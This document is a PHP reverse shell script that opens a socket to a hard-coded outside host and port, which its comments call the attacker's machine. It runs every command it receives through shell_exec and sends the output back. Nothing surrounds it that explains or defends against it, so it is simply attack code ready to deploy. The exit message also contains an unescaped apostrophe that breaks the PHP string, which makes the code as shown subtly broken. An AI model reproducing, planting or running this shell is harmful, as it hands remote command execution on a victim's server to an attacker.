<?php
$ip = 'figure-traveling.gl.at.ply.gg';  // Replace with your attacker's IP
$port = 43077;         // Replace with your attacker's port

// Create a socket and connect back to the attacker's machine
$sock = fsockopen($ip, $port);
if (!$sock) {
    exit('Unable to connect to the attacker's machine.');
}

// Redirect the input and output
while ($cmd = fgets($sock, 1024)) {
    $output = shell_exec($cmd);
    fwrite($sock, $output);
}

fclose($sock);
?>
